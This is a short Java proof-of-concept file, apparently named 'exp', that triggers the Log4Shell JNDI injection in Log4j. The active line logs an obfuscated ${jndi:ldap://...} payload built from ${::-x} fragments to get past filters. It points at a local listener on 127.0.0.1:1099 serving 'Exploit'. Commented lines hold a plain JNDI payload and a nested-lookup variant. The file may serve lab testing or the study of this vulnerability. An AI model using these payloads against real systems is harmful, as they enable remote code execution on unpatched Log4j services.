import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.net.URI;

public class exp {
    public static final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {

        logger.error("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:1099/`Exploit}");
        //logger.error("${jndi:ldap://127.0.0.1:1099/Exploit}");
        //logger.error("${${::-${::-$${::-aaa}}}}");
    }
}
